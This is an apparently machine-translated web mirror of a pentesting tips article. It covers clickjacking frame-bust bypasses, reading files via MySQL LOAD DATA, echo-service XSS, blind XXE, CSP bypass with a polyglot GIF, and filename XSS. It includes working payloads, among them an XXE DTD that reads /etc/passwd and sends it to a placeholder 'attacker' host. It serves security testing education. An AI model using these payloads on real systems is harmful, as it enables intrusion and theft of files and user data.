<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>A selection of tricks in analyzing the security of web applications</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello! This topic is devoted to various tricks in the analysis of security (pentest) web applications. From time to time you come across a situation w...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>A selection of tricks in analyzing the security of web applications</h1><div class="post__text post__text-html js-mediator-article">  Hello!  This topic is devoted to various tricks in the analysis of security (pentest) web applications.  From time to time you come across a situation where you have to bypass some kind of protection, get out of these limitations, or just test some non-obvious place.  And this post is just about that!  Welcome under cat. <br><a name="habracut"></a><br><h4>  Trick # 1 - Bypass Clickjacking Protection </h4><br><blockquote>  <b>Clickjacking</b> (Clickjacking) is a mechanism for deceiving Internet users, in which an attacker can gain access to confidential information or even gain access to a user's computer by luring it on a seemingly harmless page or by introducing malicious code on a secure page.  The principle is based on the fact that there is an invisible layer on top of the visible page, into which the page needed by the attacker is loaded, while the control element (button, link) necessary to perform the required action is combined with the visible link or button, which is expected to be clicked .  Various applications of the technology are possible - from a subscription to a resource in a social network to theft of confidential information and making purchases in online stores at someone else's account (C) <a href="http://ru.wikipedia.org/wiki/%25D0%259A%25D0%25BB%25D0%25B8%25D0%25BA%25D0%25B4%25D0%25B6%25D0%25B5%25D0%25BA%25D0%25B8%25D0%25BD%25D0%25B3">http://ru.wikipedia.org/wiki/Klikdzheking</a> </blockquote><br>  With this attack, you need to display the resource in the frame, and the right way to protect is to add the X-Frame-Options header with the necessary restrictions (usually, it is forbidden to show the resource in the frame to everyone). <br>  But on a fairly large number of sites you can find similar code: <br><br><pre><code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (self !== top) { top.location = self.location; }</code> </pre> <br>  Javascript, with which the resource is trying to "jump out" of the frame.  And there are two ways to circumvent this protection. <br><br><h5>  1. Race condition </h5><br>  We can ‚Äúhang up‚Äù a new Listener on the unload window and enter the whole window in the race state <br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> kill_bust = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.onbeforeunload = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{kill_bust++}; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (kill_bust &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { kill_bust -= <span class="hljs-number"><span class="hljs-number">2</span></span>; top.location = <span class="hljs-string"><span class="hljs-string">'204.php'</span></span>; }}, <span class="hljs-number"><span class="hljs-number">1</span></span>);</code> </pre> <br>  Where 204.php is the following script 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="php hljs">header(<span class="hljs-string"><span class="hljs-string">"HTTP/1.0 204 No Response"</span></span>);</code> </pre><br>  As a result, do not let the site "jump out" of the frame. <br><br><h5>  2. Using HTML5 Standards </h5><br>  We can limit the action of scripts in the frame, opening it in sandbox mode <br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://victim.com"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">sandbox</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">" allow-forms allow-scripts"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre><br>  These methods were reviewed at the ZeroNights workshop: <a href="http://2013.zeronights.org/includes/docs/Krzysztof_Kotowicz_-_Hacking_HTML5.pdf">2013.zeronights.org/includes/docs/Krzysztof_Kotowicz_-_Hacking_HTML5.pdf</a> <br><br><h4>  Trick # 2 - Reading files in MySQL with no file_priv </h4><br>  It is believed that reading files in MySQL is possible only with user privileges set for the file.  But it is not so.  If we have the right to create tables - we can read a file when creating a table without having file_priv <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">LOAD</span></span> <span class="hljs-keyword"><span class="hljs-keyword">DATA</span></span> <span class="hljs-keyword"><span class="hljs-keyword">LOCAL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INFILE</span></span> <span class="hljs-string"><span class="hljs-string">'/etc/passwd'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> <span class="hljs-keyword"><span class="hljs-keyword">TABLE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">test</span></span> <span class="hljs-keyword"><span class="hljs-keyword">FIELDS</span></span> <span class="hljs-keyword"><span class="hljs-keyword">TERMINATED</span></span> <span class="hljs-keyword"><span class="hljs-keyword">BY</span></span> <span class="hljs-string"><span class="hljs-string">' '</span></span>;</code> </pre><br>  and <br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">test</span></span>;</code> </pre><br>  This topic is disassembled on the <a href="https://rdot.org/forum/showthread.php%3Ft%3D741">rdot</a> forum. <br><br><h4>  Trick # 3 - Using echo services for XSS </h4><br>  This trick relates to making PoC for very specific XSS.  Imagine an echo service that simply gives the requested content back.  If we access it via HTTP, it will simply return all our HTTP request to us.  And if we request something like <a href="http://victim.com/">victim.com</a> : 1024 / &lt;script&gt; alert (1) &lt;/ script&gt;?  Then he will return to us the entire HTTP request, where XSS will be at the beginning.  But here are two points. <br><br><ol><li>  The HTTP response will be incorrect (for HTTP version 1.X +), but in HTTP version 0.9 it is not necessary to correctly respond to the request, so some browsers (Internet Explorer) will render such responses.  This can be found in the book The Tangled Web by Michal Zalewski. </li><li>  Before sending a request to the server, the browser converts the url into a ‚Äúsafe‚Äù view (% 20 and similar items in your address bar).  As a result, the echo service will return not our tags with xss - &lt;script&gt;, but% 3Cscript% 3E.  But!  Internet Explrer does not encode the data after the first question (GET parameters) in the URL. </li></ol><br>  But there is a way to force Explorer not to encode anything in the URL (this method was accidentally found during Pentest).  This is to give the link to IE via the Location header. <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> header(<span class="hljs-string"><span class="hljs-string">"Location: http://victim/ANY_DATA_HERE_WILL_BE_NOT_ENCODED"</span></span>); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre><br>  As a result, send a ‚Äúnormal‚Äù request to the echo service, which will return it to us.  And IE - will render. <br>  Then a logical question arises, what about the Same Origin Policy?  After all, we are running js on a different port, different from the port of the web server and the site we are attacking?  In Internet explorer, the port is ignored when detecting an SOP, like this.  As a result, a similar trick helps just to show (POC) that the vector is in the data, in very difficult conditions.  For example - the similar was found by our surveys in SAP. <br><br><h4>  Trick # 4 - Reading data with a "blind" XML injection </h4><br>  <b><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XXE</a></b> is an attack on applications that process XML.  Instead of some valid and expected data, XML elements are sent for processing, which the parser must (by default) first parse, and only then process all the XML.  As an entity, you can specify a file (for example, as a nickname) and then look at your nickname (and this / some / etc / passwd).  But there are situations when you send XML and everything, nowhere, no answers.  With such a "blind" injection, you can use the Japanese / PT vector. <br><br>  The first XML with DTD to external address is given: <br><br>  <b>evil.xml</b> <br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE foo SYSTEM "http://attacker/test.dtd" &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">foo</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;e1;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">foo</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  <b>test.dtd</b> <br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">!ENTITY</span></span></span><span class="hljs-tag"> % </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">p1</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">SYSTEM</span></span></span><span class="hljs-tag"> "</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">file:</span></span></span><span class="hljs-tag">///</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">etc</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">passwd</span></span></span><span class="hljs-tag">"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">!ENTITY</span></span></span><span class="hljs-tag"> % </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">p2</span></span></span><span class="hljs-tag"> "&lt;!</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ENTITY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">e1</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">SYSTEM</span></span></span><span class="hljs-tag"> '</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">attacker</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">BLAH</span></span></span><span class="hljs-tag">#%</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">p1</span></span></span><span class="hljs-tag">;'&gt;</span></span>"&gt; %p2;</code> </pre><br><br>  As a result, the XML parser will process the data above and try to query the GET entity with a request, in the parameters of which there will be file data (and there we will already monitor access.log). <br><br><h4>  Trick # 5 - CSP bypass and javascript execution from a GIF file </h4><br>  Content-Security-Policy is a header that tells the browser where to load various data (for example, JS), everything else is prohibited.  This greatly complicates the exploitation of XSS vulnerabilities.  We can deploy, but js can not be executed, .js files are allowed only from some specific domains.  Now, if we can upload files (for example, attach to a letter), then we can generate an ‚Äúevil‚Äù completely valid GIF file, with which <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag"> = </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://domain-in-white-list/evil_image.gif"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  JS is fulfilled.  <a href="http://sergeybelove.ru/tools/img_js.html">The demo</a> <a href="http://pastebin.com/6yUbfGX5">script</a> was used in <a href="http://isciurus.blogspot.ru/2013/04/a-story-of-9500-bug-in-facebook-oauth-20.html">FaceBook</a> . <br><br><h4>  Trick # 6 - ignoring the Content-Disposition: attachment header and rendering the script in the browser. </h4><br>  I have described this vector in great detail <a href="http://habrahabr.ru/company/dsec/blog/202784/">here</a> .  The point is that iOS devices ignore this header and ‚Äúusable‚Äù content (html / svg) is rendered in the browser.  An example from the last article of an attachment from gmail, which should not automatically open in the browser <br><table><tbody><tr><td>  GMail </td><td><img src="https://habrastorage.org/getpro/habr/post_images/f7a/4c0/d74/f7a4c0d748f97e70cff9106893c2acc2.jpg"></td><td><img src="https://habrastorage.org/getpro/habr/post_images/827/38a/6d2/82738a6d2751bb0e41b11e9e29692513.jpg"></td></tr></tbody></table><br><br><h4>  Trick # 7 - "Unpopular" place when testing for XSS </h4><br>  The fact is that the place described in the trick is really very unpopular when testing for XSS among many pentesters. <br><br>  The idea: create a file &lt;img src = x onerror = alert (1)&gt;. Jpeg and send to the victim. <br><br>  Under Linux systems, simply create a file with this name. <br><br><pre>  # touch '&lt;img src = x onerror = alert (1)&gt;. jpeg' </pre><br>  But under Windows - it is impossible, due to the peculiarities of the file systems of this OS.  The solution is very simple, let all the traffic Burp Proxy and replace the data at the stage of sending <br><br><pre> ------ WebKitFormBoundaryFS9MRFpHBt02jHkz
 Content-Disposition: form-data;  name = "upload [0]";  filename = ""&gt; &lt;img src = x onerror = alert (1)&gt; "
</pre><br>  In a similar way, XSS was found in Google AdWords - <a href="http://c0rni3sm.blogspot.ru/2013/12/google-adwords-stored-xss-from-nay-to.html">c0rni3sm.blogspot.ru/2013/12/google-adwords-stored-xss-from-nay-to.html</a> , which could be used against other users. <br><br>  Thanks for attention! </div><p>Source: <a href="https://habr.com/ru/post/210338/">https://habr.com/ru/post/210338/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../210328/index.html">News digest from the world of mobile development for the last week ‚Ññ38 (January 20-26, 2014)</a></li>
<li><a href="../210330/index.html">We refuse callbacks: Generators in ECMAScript 6</a></li>
<li><a href="../210332/index.html">The look of the advertiser on web design: the basics of creating an atypical design for a typical site</a></li>
<li><a href="../210334/index.html">The most difficult game of all time</a></li>
<li><a href="../210336/index.html">PVS-Studio, CppCat. Interview with Andrei Karpov, technical director of these projects</a></li>
<li><a href="../210344/index.html">Input throttling on AngularJS using debounce</a></li>
<li><a href="../210346/index.html">Increase the efficiency of solar panels using a heating element</a></li>
<li><a href="../210348/index.html">Alice's syndrome in the looking glass: what and how to read ?.</a></li>
<li><a href="../210350/index.html">Family photo without a grandmother, or what to do when an ECC crashes?</a></li>
<li><a href="../210358/index.html">A cinema visitor wearing Google Glass was pulled out of the hall by FBI employees.</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>